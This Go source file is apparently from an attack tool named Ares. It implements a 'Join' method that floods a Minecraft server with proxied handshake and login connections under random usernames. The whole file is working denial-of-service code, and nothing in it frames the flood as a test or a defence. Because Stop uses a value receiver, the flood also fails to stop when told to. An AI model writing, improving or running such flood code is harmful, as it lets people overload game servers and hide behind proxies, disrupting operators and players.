package methods

import (
	"Ares/core"
	"Ares/net/minecraft"
	"Ares/net/minecraft/packet"
	"Ares/utils"
	"Ares/utils/mcutils"
	"fmt"
	"net"
	"strconv"
	"time"
)

type Join struct {
	Config          *core.AttackConfig
	isRunnig        bool
	handshakePacket packet.Packet
}

func (j Join) Start() {
	ip, port, err := net.SplitHostPort(j.Config.Host)
	if err != nil {
		fmt.Println(err)
	}
	iport, _ := strconv.Atoi(port)
	if err != nil {
		fmt.Println(err)
	}
	j.handshakePacket = mcutils.GetHandshakePacket(ip, iport, j.Config.Version, mcutils.Login)
	j.isRunnig = true
	for i := 0; i < j.Config.Loops; i++ {
		go loop(&j)
	}
}

func loop(j *Join) {
	for j.isRunnig {
		for i := 0; i < j.Config.PerDelay; i++ {
			go connect(j)
		}
		time.Sleep(j.Config.Delay)
	}
}

func connect(j *Join) error {
	conn, err := minecraft.DialMc(j.Config.Host, j.Config.ProxyManager.GetNext())
	if err != nil {
		return err
	}

	conn.WritePacket(j.handshakePacket)
	conn.WritePacket(mcutils.GetLoginPacket(utils.RandomName(16), j.Config.Version))

	defer conn.Close()
	return nil
}

func (j Join) Stop() {
	j.isRunnig = false
}
